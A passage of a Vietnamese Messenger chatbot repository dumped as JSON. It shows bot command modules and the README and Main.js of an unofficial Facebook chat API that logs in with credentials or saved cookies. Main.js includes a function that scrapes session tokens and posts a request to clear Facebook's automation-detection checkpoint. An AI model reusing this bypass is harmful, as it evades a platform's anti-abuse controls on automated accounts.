await  axios.get(`https://10minutemail.net/address.api.php`)\n      var data = get.data.mail_list[0]\n      var email = get.data.mail_get_mail\n      var id = data.mail_id,\n        from = data.from,\n        subject = data.subject,\n        time = data.datetime2\n      let formMail = from.replace(/\\./g,' . ')\n      let maill = email.replace(/\\./g,' . ')\n      return api.sendMessage(`¬ª Email: ${maill}\\n¬ª ID Mail: ${id}\\n¬ª From: ${formMail}\\n¬ª Ti√™u ƒë·ªÅ: ${subject}\\n¬ª ${time}`, event.threadID, event.messageID)}\nelse if (args.join() == \"\") { \n    return api.sendMessage(`NEW - T·∫°o mail m·ªõi \\n\nCHECK - Check h·ªôp th∆∞ ƒë·∫øn \\n\nGET - L·∫•y mail hi·ªán t·∫°i \\n\nLIST - Xem list mail \\n\nMORE - Th√™m mail m·ªõi \\n\n-------------------------\\n\\n\nB·∫°n c√≥ th·ªÉ click v√†o url mail v√† nh·∫≠p Key Mail ƒë·ªÉ xem n·ªôi dung mail. `, event.threadID, event.messageID)} \n    }","path":null,"size_bytes":3554,"size_tokens":null},"modules/commands/pending.js":{"content":"module.exports.config = {\n    \"name\": \"pending\",\n    \"version\": \"1.0.6\",\n    \"credits\": \"Niiozic\",\n    \"hasPermssion\": 2,\n    \"description\": \"Qu·∫£n l√Ω tin nh·∫Øn ch·ªù c·ªßa bot\",\n    \"commandCategory\": \"H·ªá Th·ªëng\",\n    \"usages\": \"[u] [t] [a]\",\n    \"cooldowns\": 5\n};\n\nmodule.exports.handleReply = async function({ api, event, handleReply, getText }) {\n  const axios = require(\"axios\")\n  const fs = require('fs-extra');\n  const request = require('request')\n    if (String(event.senderID) !== String(handleReply.author)) return;\n    const { body, threadID, messageID } = event;\n    var count = 0;\n\n    if (isNaN(body) && body.indexOf(\"c\") == 0 || body.indexOf(\"cancel\") == 0) {\n        const index = (body.slice(1, body.length)).split(/\\s+/);\n        for (const singleIndex of index) {\n            console.log(singleIndex);\n            if (isNaN(singleIndex) || singleIndex <= 0 || singleIndex > handleReply.pending.length) return api.sendMessage(`‚Üí ${singleIndex} Kh√¥ng ph·∫£i l√† m·ªôt con s·ªë h·ª£p l·ªá`, threadID, messageID);\n        }\n        return api.sendMessage(`[ PENDING ] - ƒê√£ t·ª´ ch·ªëi th√†nh c√¥ng`, threadID, messageID);\n    }\n    else {\n\n        const index = body.split(/\\s+/);\n        const fs = require(\"fs\");       \n        for (const singleIndex of index) {\n            if (isNaN(singleIndex) || singleIndex <= 0 || singleIndex > handleReply.pending.length) return api.sendMessage(`‚Üí ${singleIndex} Kh√¥ng ph·∫£i l√† m·ªôt con s·ªë h·ª£p l·ªá`, threadID, messageID);\n            api.unsendMessage(handleReply.messageID);\n            api.changeNickname(`[ ${global.config.PREFIX} ] ‚Ä¢ ${(!global.config.BOTNAME) ? \"TatsuYTB\" : global.config.BOTNAME}`, handleReply.pending[singleIndex - 1].threadID, api.getCurrentUserID());\n            api.sendMessage(\"\", event.threadID, () => api.sendMessage(`‚ùØ ùêçùê°ùê®ÃÅùê¶ ùêúùêÆÃâùêö ùêõùêöÃ£ùêß ùêùùêöÃÉ ùêùùêÆÃõùê®ÃõÃ£ùêú ùêùùêÆùê≤ùêûÃ£ÃÇùê≠ ùê•ùê¢ùêûÃÇùêß ùê°ùêûÃ£ÃÇ ùêÄùêÉùêåùêàùêç ùêùùêûÃÇÃâ ùê•ùêöÃÇÃÅùê≤ ùê§ùêûùê≤ ùê≠ùê°ùêÆùêûÃÇ ùêõùê®ùê≠`, handleReply.pending[singleIndex - 1].threadID));\n            count+=1;\n            \n        }\n        return api.sendMessage(`[ PENDING ] - ƒê√£ ph√™ duy·ªát th√†nh c√¥ng`, threadID, messageID);\n    }\n}\n\nmodule.exports.run = async function({ api, event, args, permission, handleReply }) {\n        if (args.join() == \"\") {api.sendMessage(\"‚ùØ Pending user: H√†ng ch·ªù ng∆∞·ªùi d√πng\\n‚ùØ Pending thread: H√†ng ch·ªù nh√≥m\\n‚ùØ Pending all: T·∫•t c·∫£ box ƒëang ch·ªù duy·ªát\",event.threadID, event.messageID);\n    }\n        const content = args.slice(1, args.length);   \n     switch (args[0]) {\n    case \"user\":\n    case \"u\":\n    case \"-u\":\n    case \"User\": {\n    const { threadID, messageID } = event;\n    const commandName = this.config.name;\n    var msg = \"\", index = 1;\n    \n    try {\n        var spam = await api.getThreadList(100, null, [\"OTHER\"]) || [];\n        var pending = await api.getThreadList(100, null, [\"PENDING\"]) || [];\n    } catch (e) { return api.sendMessage(\"[ PENDING ] - Kh√¥ng th·ªÉ l·∫•y danh s√°ch ch·ªù\", threadID, messageID) }\n\n      const list = [...spam, ...pending].filter(group => group.isGroup == false);\n\n    for (const single of list) msg += `${index++}. ${single.name}\\n${single.threadID}\\n`;\n\n    if (list.length != 0) return api.sendMessage(`‚Üí T·ªïng s·ªë ng∆∞·ªùi d√πng c·∫ßn duy·ªát: ${list.length} ng∆∞·ªùi d√πng\\n${msg}\\nReply (ph·∫£n h·ªìi) theo stt ƒë·ªÉ duy·ªát`, threadID, (error, info) => {\n        global.client.handleReply.push({\n            name: commandName,\n            messageID: info.messageID,\n            author: event.senderID,\n            pending: list\n        })\n    }, messageID);\n    else return api.sendMessage(\"[ PENDING ] - Hi·ªán t·∫°i kh√¥ng c√≥ ng∆∞·ªùi d√πng n√†o trong h√†ng ch·ªù\", threadID, messageID);\n}\n    case \"thread\":\n    case \"-t\":\n    case \"t\":\n    case \"Thread\": {\n     const { threadID, messageID } = event;\n    const commandName = this.config.name;\n    var msg = \"\", index = 1;\n    \n    try {\n        var spam = await api.getThreadList(100, null, [\"OTHER\"]) || [];\n        var pending = await api.getThreadList(100, null, [\"PENDING\"]) || [];\n    } catch (e) { return api.sendMessage(\"[ PENDING ] - Kh√¥ng th·ªÉ l·∫•y danh s√°ch ƒëang ch·ªù\", threadID, messageID) }\n\n    const list = [...spam, ...pending].filter(group => group.isSubscribed && group.isGroup);\n\n    for (const single of list) msg += `${index++}. ${single.name}\\n${single.threadID}\\n`;\n\n    if (list.length != 0) return api.sendMessage(`‚Üí T·ªïng s·ªë nh√≥m c·∫ßn duy·ªát: ${list.length} nh√≥m\\n${msg}\\nReply (ph·∫£n h·ªìi) theo stt ƒë·ªÉ duy·ªát`, threadID, (error, info) => {\n        global.client.handleReply.push({\n            name: commandName,\n            messageID: info.messageID,\n            author: event.senderID,\n            pending: list\n        })\n    }, messageID);\n    else return api.sendMessage(\"[ PENDING ] - Hi·ªán t·∫°i kh√¥ng c√≥ nh√≥m n√†o trong h√†ng ch·ªù\", threadID, messageID);\n        }\n    case \"all\":\n    case \"a\":\n    case \"-a\":\n    case \"al\": {\n     const { threadID, messageID } = event;\n    const commandName = this.config.name;\n    var msg = \"\", index = 1;\n    \n    try {\n        var spam = await api.getThreadList(100, null, [\"OTHER\"]) || [];\n        var pending = await api.getThreadList(100, null, [\"PENDING\"]) || [];\n    } catch (e) { return api.sendMessage(\"[ PENDING ] - Kh√¥ng th·ªÉ l·∫•y danh s√°ch ch·ªù\", threadID, messageID) }\n\n            const listThread = [...spam, ...pending].filter(group => group.isSubscribed && group.isGroup);\n        const listUser = [...spam, ...pending].filter(group => group.isGroup == false)\n    const list = [...spam, ...pending].filter(group => group.isSubscribed);\n\n    for (const single of list) msg += `${index++}. ${single.name}\\n${single.threadID}\\n`;\n\n    if (list.length != 0) return api.sendMessage(`‚Üí T·ªïng s·ªë User & Thread c·∫ßn duy·ªát: ${list.length} User & Thread\\n${msg}\\nReply (ph·∫£n h·ªìi) theo stt ƒë·ªÉ duy·ªát`, threadID, (error, info) => {\n        global.client.handleReply.push({\n            name: commandName,\n            messageID: info.messageID,\n            author: event.senderID,\n            pending: list\n        })\n    }, messageID);\n    else return api.sendMessage(\"[ PENDING ] - Hi·ªán t·∫°i kh√¥ng c√≥ User & Thread n√†o trong h√†ng ch·ªù\", threadID, messageID);\n        }\n    }       \n}","path":null,"size_bytes":6424,"size_tokens":null},"modules/commands/binary.js":{"content":"module.exports.config = {\n    name: \"binary\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    Rent: 1,\n    credits: \"Khoa x Nam\",\n    description: \"chuy·ªÉn vƒÉn b·∫£n sang m√£ nh·ªã ph√¢n v√† ng∆∞·ª£c l·∫°i\",\n    commandCategory: \"C√¥ng c·ª•\",\n    usages: \"[encode/decode] [text/binary]\",\n    cooldowns: 0\n  };\n  \n  function encode(text) {\n    return (\n      Array\n        .from(text)\n        .reduce((acc, char) => acc.concat(char.charCodeAt().toString(2)), [])\n        .map(bin => '0'.repeat(8 - bin.length) + bin )\n        .join(\" \")\n    );\n  };\n  \n  function decode(binary) {\n    const arrayOfBytes = binary.split(\" \");\n    let Output = \"\";\n    for (let i = 0; i < arrayOfBytes.length; i++) Output += String.fromCharCode(parseInt(arrayOfBytes[i], 2));\n    return Output;\n  };\n  \n  module.exports.run = async function ({ api, event, args }) {\n    var { threadID, messageID, senderID } = event;\n    if (args.length <= 1) return api.sendMessage(\"Kh√¥ng ƒë√∫ng c√∫ ph√°p!\", threadID, messageID);\n    var type = args[0].toLowerCase();\n    const allType = [\"encode\",\"en\",\"decode\",\"de\"];\n    if (!allType.includes(type)) return api.sendMessage(\"Kh√¥ng ƒë√∫ng c√∫ ph√°p!\", threadID, messageID);\n    var input = event.body.slice(event.body.indexOf(args[1]));\n    if (type == \"encode\" || type == \"en\") return api.sendMessage(`${encode(input)}`, threadID, messageID);\n    if (type == \"decode\" || type == \"de\") return api.sendMessage(`${decode(input)}`, threadID, messageID);\n      }","path":null,"size_bytes":1475,"size_tokens":null},"modules/commands/out.js":{"content":"module.exports.config = {\n  name: \"out\",\n  version: \"1.0.0\",\n  hasPermssion: 2,\n  credits: \"D≈©ngUwU\",\n  description: \"out box\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"[tid]\",\n  cooldowns: 3\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n  var id;\n  if (!args.join(\" \")) {\n    id = event.threadID;\n  } else {\n    id = parseInt(args.join(\" \"));\n  }\n  return api.sendMessage('ƒê√£ nh·∫≠n l·ªánh out nh√≥m t·ª´ admin!', id, () => api.removeUserFromGroup(api.getCurrentUserID(), id))\n}","path":null,"size_bytes":505,"size_tokens":null},"lib/Fca-Horizon-Remastered/README.md":{"content":"[![Socket Badge](https://socket.dev/api/badge/npm/package/fca-horizon-remastered)](https://socket.dev/npm/package/fca-horizon-remastered)\n\n# The following are not allowed here and a little note:\n\nüéÜ\n\n## Important !\n\n<img width=\"517\" alt=\"Reason\" src=\"https://i.imgur.com/rD3ujmL.png\">\nThis project is no longer being developed because the project owner lacks high security capabilities, leading to potential security vulnerabilities. Therefore, the project will be permanently suspended.\n\nSpecial Thanks: \n![image](https://github.com/KanzuXHorizon/Fca-Horizon-Remastered/assets/125113101/0a455054-b7f4-499d-b4b6-c91fd0569ce4)\n\n## Important !\n\nThis package require NodeJS 14.17.0 to work properly.\n\n## Notification !\n\n+ We will have Example Video on Channel \"Nguy·ªÖn Th√°i H·∫£o Official\"\n\nOriginal Project(Deprecated): https://github.com/Schmavery/facebook-chat-api\n\nCh√∫c c√°c b·∫°n m·ªôt ng√†y t·ªët l√†nh!, c·∫£m ∆°n v√¨ ƒë√£ s√†i S·∫£n ph·∫©m c·ªßa HZI, th√¢n √°i\n\nKANZUWAKAZAKI(15/04/2023)\n\n## Support For : \n\n+ Support English, VietNamese !,\n+ All bot if using listenMqtt first.\n\n# Api Cho ChatBot Messenger\n\nFacebook ƒê√£ C√≥ V√† Cho Ng∆∞·ªùi D√πng T·∫°o Api Cho Chatbots üò™ T·∫°i ƒêey => [ƒê√¢y N√®](https://developers.facebook.com/docs/messenger-platform).\n\n### Api N√†y C√≥ Th·ªÉ Khi·∫øn Cho B·∫°n Payy Acc Nh∆∞ C√°ch Acc B·∫°n Ch∆∞a T·ª´ng C√≥, H√£y Ch√∫ √ù Nh√© =))\n\nL∆∞u √ù ! N·∫øu B·∫°n Mu·ªën S√†i Api N√†y H√£y Xem Document T·∫°i [ƒê√¢y N√®](https://github.com/Schmavery/facebook-chat-api).\n\n## T·∫£i V·ªÅ \n\nN·∫øu B·∫°n Mu·ªën S·ª≠ D·ª•ng, H√£y T·∫£i N√≥ B·∫±ng C√°ch:\n```bash\nnpm i fca-horizon-remastered\n```\nor\n```bash\nnpm install fca-horizon-remastered\n```\n\nN√≥ S·∫Ω T·∫£i V√¥ node_modules (Lib C·ªßa B·∫°n) - L∆∞u √ù Replit S·∫Ω Kh√¥ng Hi·ªán ƒê√¢u M√† T√¨m üò™\n\n### T·∫£i B·∫£n M·ªõi Nh·∫•t Ho·∫∑c Update\n\nN·∫øu B·∫°n Mu·ªën S·ª≠ D·ª•ng Phi√™n B·∫£n M·ªõi Nh·∫•t Hay C·∫≠p Nh·∫≠t Th√¨ H√£y V√¥ Terminal Ho·∫∑c Command Promt Nh·∫≠p :\n```bash\nnpm install fca-horizon-remastered@latest\n```\nHo·∫∑c\n```bash\nnpm i fca-horizon-remastered@latest\n```\n\n## N·∫øu B·∫°n Mu·ªën Test Api \n\nL·ª£i √çch Cho Vi·ªác N√†y Th√¨ B·∫°n S·∫Ω Kh√¥ng T·ªën Th·ªùi Gian Pay Acc V√† C√≥ Acc üò™\nH√£y S·ª≠ D·ª•ng V·ªõi T√†i Kho·∫£n Th·ª≠ Nghi·ªám => [Facebook Whitehat Accounts](https://www.facebook.com/whitehat/accounts/).\n\n## C√°ch S·ª≠ D·ª•ng\n\n```javascript\nconst login = require(\"fca-horizon-remastered\"); // l·∫•y t·ª´ lib ra \n\n// ƒëƒÉng nh·∫≠p\nlogin({email: \"Gmail Account\", password: \"M·∫≠t Kh·∫©u Facebook C·ªßa B·∫°n\"}, (err, api) => {\n\n    if(err) return console.error(err); // tr∆∞·ªùng h·ª£p l·ªói\n\n    // t·∫°o bot t·ª± ƒë·ªông nh√°i theo b·∫°n:\n    api.listenMqtt((err, message) => {\n        api.sendMessage(message.body, message.threadID);\n    });\n\n});\n```\n\nK·∫øt Qu·∫£ L√† N√≥ S·∫Ω Nh√°i B·∫°n Nh∆∞ H√¨nh D∆∞·ªõi:\n<img width=\"517\" alt=\"screen shot 2016-11-04 at 14 36 00\" src=\"https://cloud.githubusercontent.com/assets/4534692/20023545/f8c24130-a29d-11e6-9ef7-47568bdbc1f2.png\">\n\nN·∫øu B·∫°n Mu·ªën S·ª≠ D·ª•ng N√¢ng Cao Th√¨ H√£y S·ª≠ D·ª•ng C√°c Lo·∫°i Bot ƒê∆∞·ª£c Li·ªát K√™ ·ªû Tr√™n !\n\n## Danh S√°ch\n\nB·∫°n C√≥ Th·ªÉ ƒê·ªçc Full Api T·∫°i => [here](DOCS.md).\n\n## C√†i ƒê·∫∑t Cho Mirai: \n\nB·∫°n C·∫ßn V√¥ File Mirai.js,Sau ƒê√≥ T√¨m ƒê·∫øn D√≤ng\n```js\n    var login = require('t√πy bot'); \n    /* C√≥ th·ªÉ l√† :\n        var login = require('@maihuybao/fca-Unofficial');\n        var login = require('fca-xuyen-get');\n        var login = require('fca-unofficial-force');\n    ...   \n    */\n```\n\nV√† Thay N√≥ B·∫±ng:\n\n```js\n    var login = require('fca-horizon-remastered')\n```\n\nSau ƒê√≥ Th√¨ Ch·∫°y B√¨nh Th∆∞·ªùng Th√¥i  !\n\n## T·ª± Nghi√™n C·ª©u\n\nN·∫øu B·∫°n Mu·ªën T·ª± Nghi√™n C·ª©u Ho·∫∑c T·∫°o Bot Cho Ri√™ng B·∫°n Th√¨ B·∫°n H√£y V√¥ C√°i N√†y ƒê·ªçc Ch·ª©c NƒÉng C·ªßa N√≥ V√† C√°ch S·ª≠ D·ª•ng => [Link](https://github.com/Schmavery/facebook-chat-api#Unofficial%20Facebook%20Chat%20API)\n\n------------------------------------\n\n### L∆∞u L·∫°i Th√¥ng Tin ƒêƒÉng Nh·∫≠p.\n\nƒê·ªÉ L∆∞u L·∫°i Th√¨ B·∫°n C·∫ßn 1 Apstate Ki·ªÉu (Cookie, etc,..) ƒê·ªÉ L∆∞u L·∫°i Ho·∫∑c L√† S·ª≠ D·ª•ng M√£ Login Nh∆∞ Tr√™n ƒê·ªÉ ƒêƒÉng Nh·∫≠p !\n\nV√† Ch·∫ø ƒê·ªô N√†y ƒê√£ C√≥ S·∫µn Trong 1 S·ªë Bot Vi·ªát Nam N√™n B·∫°n C·ª© Y√™n T√¢m Nh√© !\n\n__H∆∞·ªõng D·∫´n V·ªõi Appstate__\n\n```js\nconst fs = require(\"fs\");\nconst login = require(\"fca-horizon-remastered\");\n\nvar credentials = {email: \"FB_EMAIL\", password: \"FB_PASSWORD\"}; // th√¥ng tin tk\n\nlogin(credentials, (err, api) => {\n    if(err) return console.error(err);\n    // ƒëƒÉng nh·∫≠p\n    fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState(), null,'\\t')); //t·∫°o appstate\n});\n```\n\nHo·∫∑c D·ªÖ D√†ng H∆°n ( Chuy√™n Nghi·ªáp ) B·∫°n C√≥ Th·ªÉ D√πng => [c3c-fbstate](https://github.com/c3cbot/c3c-fbstate) ƒê·ªÉ L·∫•y Fbstate And Rename L·∫°i Th√†nh Apstate C≈©ng ƒê∆∞·ª£c ! (appstate.json)\n\n------------------------------------\n\n## FAQS\n\nFAQS => [Link](https://github.com/Schmavery/facebook-chat-api#FAQS)\n","path":null,"size_bytes":4975,"size_tokens":null},"lib/Fca-Horizon-Remastered/Main.js":{"content":"'use strict';\n\n//-[ Require config and use ]-!/\n\nif (global.Fca.Require.FastConfig.Config != 'default') {\n    //do ssth\n}\n\nconst Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\n\n//-[ Require All Package Need Use ]-!/\n\nvar utils = global.Fca.Require.utils,\n    logger = global.Fca.Require.logger,\n    fs = global.Fca.Require.fs,\n    getText = global.Fca.getText,\n    log = global.Fca.Require.log,\n    express = require(\"express\")(),\n    { join } = require('path'),\n    cheerio = require(\"cheerio\"),\n    { readFileSync, writeFileSync } = require('fs-extra'),\n    Database = require(\"./Extra/Database\"),\n    readline = require(\"readline\"),\n    chalk = require(\"chalk\"),\n    figlet = require(\"figlet\"),\n    os = require(\"os\"),\n    deasync = require('deasync'),\n    Security = require(\"./Extra/Security/Base\"),\n    { getAll, deleteAll } = require('./Extra/ExtraGetThread'),\n    ws = require('ws'),\n    Websocket = require('./Extra/Src/Websocket'),\n    Convert = require('ansi-to-html');\n\n//-[ Set Variable For Process ]-!/\n\nlog.maxRecordSize = 100;\nvar checkVerified = null;\nconst Boolean_Option = ['online','selfListen','listenEvents','updatePresence','forceLogin','autoMarkDelivery','autoMarkRead','listenTyping','autoReconnect','emitReady'];\n\n//-[ Set And Check Template HTML ]-!/\n\nconst css = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'style.css'));\nconst js = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'script.js'));\n\n//-[ Function Generate HTML Template ]-!/\n\n/**\n * It returns a string of HTML code.\n * @param UserName - The username of the user\n * @param Type - The type of user, either \"Free\" or \"Premium\"\n * @param link - The link to the music you want to play\n * @returns A HTML file\n */\n\nfunction ClassicHTML(UserName,Type,link) {\n    return `<!DOCTYPE html>\n    <html lang=\"en\" >\n        <head>\n        <meta charset=\"UTF-8\">\n        <title>Horizon</title>\n        <link rel=\"stylesheet\" href=\"./style.css\">\n    </head>\n    <body>\n        <center>\n            <marquee><b>waiting for u :d</b></marquee>\n            <h2>Horizon User Infomation</h2>\n            <h3>UserName: ${UserName} | Type: ${Type}</h3>\n            <canvas id=\"myCanvas\"></canvas>\n            <script  src=\"./script.js\"></script>\n            <footer class=\"footer\">\n                <div id=\"music\">\n                    <audio autoplay=\"false\" controls=\"true\" loop=\"true\" src=\"${link}\" __idm_id__=\"5070849\">Your browser does not support the audio element.</audio>\n                    <br><b>Session ID:</b> ${global.Fca.Require.Security.create().uuid}<br>\n                    <br>Thanks For Using <b>Fca-Horizon-Remastered</b> - From <b>Kanzu</b> <3<br>\n                </div>\n            </footer>\n            </div>\n        </center>\n    </html>\n    </body>`\n    //lazy to change\n}\n\n\n\n//-[ Stating Http Infomation ]-!/\n\nexpress.set('DFP', (process.env.PORT || process.env.port || 80));\n\nexpress.use(function(req, res, next) {\n    switch (req.url.split('?')[0]) {\n        case '/script.js': {\n            res.writeHead(200, { 'Content-Type': 'text/javascript' });\n                res.write(js);\n            break;\n        }\n        case '/style.css': {\n            res.writeHead(200, { 'Content-Type': 'text/css' });\n                res.write(css);\n            break;\n        }\n        default: {\n            res.writeHead(200, \"OK\", { \"Content-Type\": \"text/html\" });\n            res.write(ClassicHTML(global.Fca.Require.FastConfig.HTML.UserName, \"Premium Access\", global.Fca.Require.FastConfig.HTML.MusicLink));\n        }\n    }\n    res.end();\n})\nvar Server;\nif (global.Fca.Require.FastConfig.HTML.HTML) Server= express.listen(express.get('DFP'));\n\n/*\nfunction escapeHTML(input) {\n    const entityMap = {'&': '&','<': '<','>': '>','\"': '\"',\"'\": '\\''};\n    return String(input).replace(/[&<>\"'`=\\/]/g, function(s) {\n        return entityMap[s];\n    });\n}\n//avoid html injection\n\nif (global.Fca.Require.FastConfig.Websocket_Extension.Status) {\n    var convert = new Convert();\n    if (Server != undefined) {\n        const WebSocket = new ws.Server({ noServer: true });\n        const { Client, WSS } = Websocket.connect(WebSocket);\n        Server.on('upgrade', (req, socket, head) => {\n            const escapedReq = escapeHTML(req);\n            const escapedSocket = escapeHTML(socket);\n            const escapedHead = escapeHTML(head);\n            WSS.handleUpgrade(escapedReq, escapedSocket, escapedHead, (wss) => {\n                const escapedWss = escapeHTML(wss);\n                const escapedReq = escapeHTML(req);\n        \n                escapedWss.emit('connection', escapedWss, escapedReq);\n            });\n        });\n        console._log = console.__log\n        console.log = function(data) {\n            const All = Object.keys(Client)\n            console._log.apply(data,arguments)\n            try {\n                const log = (convert.toHtml(data) || data || \"Nothing to show\")\n                console.history.push(log)\n                if (console.history.length > 80) {\n                    console.history.shift();\n                }\n                for (let i of All) {\n                    if (Client[i].Status) {\n                        Client[i].Websocket.send(JSON.stringify({ Type: \"Console\", Data: log }));\n                    }\n                    else continue;\n                }\n            }\n            catch (e) {\n                return;\n            }\n        }\n    }\n    else {\n        const WebSocket = new ws.Server({ port: 80 });\n        const { Client } = Websocket.connect(WebSocket);\n        console._log = console.__log\n        console.log = function(data) {\n            const All = Object.keys(Client)\n            console._log.apply(data,arguments)\n            try {\n                const log = convert.toHtml(data)\n                console.history.push(log)\n                if (console.history.length > 80) {\n                    console.history.shift();\n                }\n                for (let i of All) {\n                    if (Client[i].Status) {\n                        Client[i].Websocket.send(JSON.stringify({ Type: \"Console\", Data: log }));\n                    }\n                    else continue;\n                }\n            }\n            catch (e) {\n                return\n            }\n        }\n    }\n    \n}\n**/\n//-[ Function setOptions ]-!/\n\n/**\n * @param {{ [x: string]: boolean; selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize: any; online?: boolean; emitReady?: boolean; userAgent: any; logLevel?: any; pageID?: any; proxy?: any; }} globalOptions\n * @param {{ [x: string]: any; logLevel?: any; forceLogin?: boolean; userAgent?: any; pauseLog?: any; logRecordSize?: any; pageID?: any; proxy?: any; }} options\n */\n\nfunction setOptions(globalOptions, options) {\n    Object.keys(options).map(function(key) {\n        switch (Boolean_Option.includes(key)) {\n            case true: {\n                globalOptions[key] = Boolean(options[key]);\n                break;\n            }\n            case false: {\n                switch (key) {\n                    case 'pauseLog': {\n                        if (options.pauseLog) log.pause();\n                            else log.resume();\n                        break;\n                    }\n                    case 'logLevel': {\n                        log.level = options.logLevel;\n                            globalOptions.logLevel = options.logLevel;\n                        break;\n                    }\n                    case 'logRecordSize': {\n                        log.maxRecordSize = options.logRecordSize;\n                            globalOptions.logRecordSize = options.logRecordSize;\n                        break;\n                    }\n                    case 'pageID': {\n                        globalOptions.pageID = options.pageID.toString();\n                        break;\n                    }\n                    case 'userAgent': {\n                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36');\n                        break;\n                    }\n                    case 'proxy': {\n                        if (typeof options.proxy != \"string\") {\n                            delete globalOptions.proxy;\n                            utils.setProxy();\n                        } else {\n                            globalOptions.proxy = options.proxy;\n                            utils.setProxy(globalOptions.proxy);\n                        }\n                        break;\n                    }\n                    default: {\n                        log.warn(\"setOptions\", \"Unrecognized option given to setOptions: \" + key);\n                        break;\n                    }\n                }\n                break;\n            }\n        }\n    });\n}\n\nfunction BypassAutomationNotification(resp, jar, globalOptions, appstate,ID) {\n    global.Fca.BypassAutomationNotification = BypassAutomationNotification\n    try {\n        let UID;\n        if (ID) UID = ID\n        else {\n            UID = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))\n            UID = UID.value;\n        }\n        if (resp !== undefined) {\n            if (resp.request.uri && resp.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n                if (resp.request.uri.href.includes('601051028565049')) {\n                    const fb_dtsg = utils.getFrom(resp.body, '[\"DTSGInitData\",[],{\"token\":\"', '\",\"');\n                    const jazoest = utils.getFrom(resp.body, 'jazoest=', '\",');\n                    const lsd = utils.getFrom(resp.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n\n                    const FormBypass = {\n                        av: UID,\n                        fb_dtsg, jazoest, lsd,\n                        fb_api_caller_class: \"RelayModern\",\n                        fb_api_req_friendly_name: \"FBScrapingWarningMutation\",\n                        variables: JSON.stringify({}),\n                        server_timestamps: true,\n                        doc_id: 6339492849481770\n                    }\n                    return utils.post(\"https://www.facebook.com/api/graphql/\", jar, FormBypass, globalOptions)\n                    .then(utils.saveCookies(jar)).then(function(res) {\n                        global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.Bypass_AutoNoti);\n                        return process.exit(1);                    \n                    });\n                }\n                else {\n                    return resp;\n                }\n            }\n            else {\n                return resp\n            }\n        }\n        else {\n            return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(function(res) {\n                if (res.request.uri && res.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n                    if (res.request.uri.href.includes('601051028565049')) return { Status: true, Body: res.body }\n                    else return { Status: false, Body: res.body }\n                }\n                else return { Status: false, Body: res.body }\n            }).then(function(res) {\n                if (res.Status === true) {\n                    const fb_dtsg = utils.getFrom(res.Body, '[\"DTSGInitData\",[],{\"token\":\"', '\",\"');\n                    const jazoest = utils.getFrom(res.Body, 'jazoest=', '\",');\n                    const lsd = utils.getFrom(res.Body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n\n                    const FormBypass = {\n                        av: UID,\n                        fb_dtsg, jazoest, lsd,\n                        fb_api_caller_class: \"RelayModern\",\n                        fb_api_req_friendly_name: \"FBScrapingWarningMutation\",\n                        variables: JSON.stringify({}),\n                        server_timestamps: true,\n                        doc_id: 6339492849481770\n                    }\n                return utils.post(\"https://www.facebook.com/api/graphql/\", jar, FormBypass, globalOptions).then(utils.saveCookies(jar))\n                    .then(res => {\n                        global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.Bypass_AutoNoti);\n                        return res\n                    })\n                }\n                else return res;\n\n            })\n            .then(function(res) {\n                return utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar))\n            })\n            .then(function(res) {\n                return process.exit(1)\n            })\n        }\n    }\n    catch (e) {\n        console.log(e)\n    }\n}\n\n//-[ Function BuildAPI ]-!/\n\n/**\n * @param {any} globalOptions\n * @param {string} html\n * @param {{ getCookies: (arg0: string) => any[]; }} jar\n */\n\nfunction buildAPI(globalOptions, html, jar, bypass_region) {\n    //new feat\n    const fb_dtsg = utils.getFroms(html, '[\"DTSGInitData\",[],{\"token\":\"', '\",\"')[0]; //nhƒÉm nhƒÉm nhƒÉm nhƒÉm\n\n    //check tiktik\n    var userID;\n    var cookie = jar.getCookies(\"https://www.facebook.com\");\n    //.log(cookie)\n    var maybeUser = cookie.filter(function(val) { return val.cookieString().split(\"=\")[0] === \"c_user\"; });\n    var maybeTiktik = cookie.filter(function(val) { return val.cookieString().split(\"=\")[0] === \"i_user\"; });\n    if (maybeUser.length === 0 && maybeTiktik.length === 0) {\n        if (global.Fca.Require.FastConfig.AutoLogin) {\n            return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                global.Fca.Action('AutoLogin')\n            });\n        }\n        else if (!global.Fca.Require.FastConfig.AutoLogin) {\n            return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n        }\n    }\n    else {\n        if (html.indexOf(\"/checkpoint/block/?next\") > -1) log.warn(\"login\", Language.CheckPointLevelI);\n\n        if (maybeTiktik[0] && maybeTiktik[0].cookieString().includes('i_user')) {\n            userID = maybeTiktik[0].cookieString().split(\"=\")[1].toString();\n    \n        }\n        else userID = maybeUser[0].cookieString().split(\"=\")[1].toString();    \n        process.env['UID'] = logger.Normal(getText(Language.UID,userID), userID);\n\n        try {\n            clearInterval(checkVerified);\n        } catch (e) {\n            console.log(e);\n        }\n\n        var clientID = (Math.random() * 2147483648 | 0).toString(16);\n\n        var CHECK_MQTT = {\n            oldFBMQTTMatch: html.match(/irisSeqID:\"(.+?)\",appID:219994525426954,endpoint:\"(.+?)\"/),\n            newFBMQTTMatch: 